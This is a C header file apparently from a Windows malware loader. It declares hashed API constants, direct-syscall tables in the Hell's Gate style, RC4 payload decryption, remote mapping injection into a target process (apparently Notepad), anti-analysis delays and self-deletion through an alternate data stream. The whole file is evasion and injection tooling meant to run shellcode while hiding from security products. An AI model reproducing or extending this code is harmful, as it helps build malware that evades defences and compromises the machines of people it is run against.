#pragma once
#include <Windows.h>
#include "typedef.h"

#define INITIAL_SEED	8

#define NEW_STREAM L":M4rdc0re"

#define NtCreateSection_JOAA    0x192C02CE
#define NtMapViewOfSection_JOAA         0x91436663
#define NtUnmapViewOfSection_JOAA       0x0A5B9402
#define NtClose_JOAA    0x369BD981
#define NtCreateThreadEx_JOAA   0x8EC0B84A
#define NtWaitForSingleObject_JOAA      0x6299AD3D
#define NtQuerySystemInformation_JOAA   0x7B9816D6
#define NtDelayExecution_JOAA   0xB947891A
#define CallNextHookEx_JOAA     0xB8B1ADC1
#define DefWindowProcW_JOAA     0xD96CEDDC
#define GetMessageW_JOAA        0xAD14A009
#define SetWindowsHookExW_JOAA  0x15580F7F
#define UnhookWindowsHookEx_JOAA        0x9D2856D0
#define GetModuleFileNameW_JOAA         0xAB3A6AA1
#define CreateFileW_JOAA        0xADD132CA
#define GetTickCount64_JOAA     0x00BB616E
#define OpenProcess_JOAA        0xAF03507E
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SystemFunction032_JOAA  0x8CFD40A8
#define KERNEL32DLL_JOAA        0xFD2AD9BD
#define USER32DLL_JOAA  0x349D72E7
#define NTDLLDLL_JOAA   0x0141C4EE
#define LdrLoadDll_JOAA         0xA22CF128
#define Notepad_JOAA    0x92B01372

#define KEY_SIZE 16
#define HINT_BYTE 0x61

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSysC;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtQuerySystemInformation;
	VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, * PVX_TABLE;

typedef struct _API_HASHING {

	fnGetTickCount64                pGetTickCount64;
	fnOpenProcess                   pOpenProcess;
	fnCallNextHookEx                pCallNextHookEx;
	fnSetWindowsHookExW             pSetWindowsHookExW;
	fnGetMessageW                   pGetMessageW;
	fnDefWindowProcW                pDefWindowProcW;
	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
	fnGetModuleFileNameW            pGetModuleFileNameW;
	fnCreateFileW                   pCreateFileW;
	fnSetFileInformationByHandle    pSetFileInformationByHandle;

}API_HASHING, * PAPI_HASHING;

UINT32 HashStringJenkinsOneAtATime32BitW(PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

extern void ConfS(WORD wSystemCall);
extern RunSys();

BOOL InitializeSyscalls();
BOOL Rc4EncryptionViSystemFunc032(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize);
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);
BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess);

BOOL AntiAnalysis(DWORD dwMilliSeconds);
BOOL DeleteSelf();

HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
HMODULE LoadLibraryH(LPSTR DllName);

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
SIZE_T _CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
SIZE_T _StrlenA(LPCSTR String);
SIZE_T _StrlenW(LPCWSTR String);
UINT32 _CopyDotStr(PCHAR String);